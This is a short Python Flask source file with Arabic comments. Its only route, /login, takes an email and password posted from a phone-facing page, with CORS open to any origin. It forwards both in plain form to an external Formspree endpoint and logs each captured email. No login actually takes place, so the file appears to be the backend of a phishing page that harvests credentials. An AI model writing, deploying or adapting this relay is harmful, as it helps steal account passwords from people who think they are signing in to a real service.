# Pp.py
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os

app = Flask(__name__)

# تعديل الـ CORS لكي يقبل الطلبات القادمة من الهاتف بأي صيغة وضمان عدم حدوث 404
CORS(app, resources={r"/*": {"origins": "*", "methods": ["POST", "GET", "OPTIONS"]}})

FORMSPREE_URL = "https://formspree.io/f/xojzprkz"

# إضافة الدعم لـ OPTIONS و POST معاً في نفس المسار لحل مشكلة المتصفح
@app.route('/login', methods=['POST', 'OPTIONS'])
def login():
    if request.method == 'OPTIONS':
        # رد تلقائي للمتصفح للموافقة على إرسال البيانات
        return jsonify({"status": "CORS_OK"}), 200
        
    data = request.get_json()
    if not data:
        return jsonify({"status": "no_data"}), 400
        
    email = data.get('email')
    password = data.get('password')
    
    payload = {
        "email": email,
        "password": password
    }
    
    try:
        response = requests.post(FORMSPREE_URL, data=payload)
        if response.status_code == 200:
            print(f"[SUCCESS] Data sent to Formspree for: {email}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "fail"}), response.status_code
    except Exception as e:
        print(f"[EXCEPTION] {str(e)}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
